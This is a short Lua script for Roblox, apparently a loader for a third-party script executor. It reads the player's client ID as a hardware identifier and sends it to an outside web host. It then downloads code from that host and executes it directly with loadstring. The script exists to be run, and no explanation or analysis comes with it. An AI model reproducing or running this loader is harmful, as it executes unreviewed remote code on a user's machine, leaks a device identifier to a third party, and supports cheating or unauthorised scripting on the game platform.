local HttpService = game:GetService("HttpService")
local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
loadstring(game:HttpGet("https://luafly.vercel.app/api/load?hwid=" .. HWID))()